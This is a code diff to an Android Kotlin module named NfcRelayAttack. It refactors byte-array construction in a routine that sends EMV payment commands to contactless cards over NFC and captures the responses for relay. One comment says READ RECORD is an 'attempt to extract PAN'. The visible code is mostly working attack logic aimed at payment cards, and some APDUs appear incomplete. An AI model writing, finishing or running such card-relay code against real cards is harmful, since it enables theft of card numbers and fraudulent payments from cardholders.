@@ -33,6 +33,8 @@ data class RelayCapture(
 
 object NfcRelayAttack {
 
+    private fun apdu(vararg v: Int): ByteArray = ByteArray(v.size) { v[it].toByte() }
+
     fun captureAndRelay(tag: Tag, relayAddress: String = "127.0.0.1", relayPort: Int = 6669): List<RelayCapture> {
         val captures = mutableListOf<RelayCapture>()
 
@@ -42,7 +44,7 @@ object NfcRelayAttack {
                 isoDep.connect()
                 try {
                     // SELECT AID for PayWave/PayPass EMV
-                    val aidPayWave = byteArrayOf(0x00, 0xA4, 0x04, 0x00, 0x07)
+                    val aidPayWave = apdu(0x00, 0xA4, 0x04, 0x00, 0x07)
                     captures.add(RelayCapture(
                         System.currentTimeMillis(),
                         aidPayWave,
@@ -51,7 +53,7 @@ object NfcRelayAttack {
                     ))
 
                     // GET PROCESSING OPTIONS (GPO)
-                    val gpo = byteArrayOf(0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00)
+                    val gpo = apdu(0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00)
                     captures.add(RelayCapture(
                         System.currentTimeMillis(),
                         gpo,
@@ -60,7 +62,7 @@ object NfcRelayAttack {
                     ))
 
                     // READ RECORD (attempt to extract PAN)
-                    val readRecord = byteArrayOf(0x00, 0xB2, 0x01, 0x0C, 0x00)
+                    val readRecord = apdu(0x00, 0xB2, 0x01, 0x0C, 0x00)
                     captures.add(RelayCapture(
                         System.currentTimeMillis(),
                         readRecord,
@@ -69,7 +71,7 @@ object NfcRelayAttack {
                     ))
 
                     // DATA AUTHENTICATION (CDA setup)
-                    val cda = byteArrayOf(0x80, 0xAE, 0x00, 0x00, 0x02, 0x9F, 0x34)
+                    val cda = apdu(0x80, 0xAE, 0x00, 0x00, 0x02, 0x9F, 0x34)
                     captures.add(RelayCapture(
                         System.currentTimeMillis(),
                         cda,
@@ -90,10 +92,10 @@ object NfcRelayAttack {
             if (nfcA != null) {
                 nfcA.connect()
                 try {
-                    val response = nfcA.transceive(byteArrayOf(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04))
+                    val response = nfcA.transceive(apdu(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04))
                     captures.add(RelayCapture(
                         System.currentTimeMillis(),
-                        byteArrayOf(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04),
+                        apdu(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04),
                         response,
                         "NfcA SELECT AID"
                     ))
